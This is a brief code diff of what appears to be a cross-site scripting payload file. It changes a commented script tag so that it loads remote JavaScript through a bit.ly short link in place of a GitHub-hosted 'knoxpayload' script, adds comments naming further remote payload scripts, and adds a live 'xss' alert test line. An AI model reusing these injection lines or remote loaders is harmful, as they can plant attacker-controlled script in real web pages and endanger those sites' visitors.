@@ -1,5 +1,9 @@
-//<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script><script src="aldenq.github.io/knoxpayload2.js"></script>
+//<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script><script src="https://bit.ly/3jPon33"></script>
 
+
+//https://bit.ly/3jPon33
+//aldenq.github.io/k.js
+window.alert("xss");
 
 var doc = ""
 
